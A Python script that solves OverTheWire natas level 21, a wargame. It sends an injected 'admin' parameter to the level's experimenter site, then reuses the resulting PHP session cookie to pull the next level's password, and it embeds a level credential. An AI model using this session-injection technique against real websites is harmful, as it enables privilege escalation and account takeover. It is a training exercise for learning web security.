#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level21.py
  Solution for natas level21
"""
__author__ = 'kall.micke@gmail.com'

import requests
import datetime
import time
import sys
import os
import re

level = 21
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
host_exp = 'http://natas%s-experimenter.natas.labs.overthewire.org' % level
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

def get_flag():

    session = requests.Session()
    session.auth = (user, password)
    postData = {'align': 'center', 'fontsize': '200', 'bgcolor': 'red', 'submit': 'Update', 'admin':1}
    r = session.post(host_exp, data=postData, auth=(user, password))
    time.sleep(0.5)
    cookie = {'PHPSESSID': r.cookies['PHPSESSID']}
    r = session.get(host, auth=(user, password), cookies=cookie)
    m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
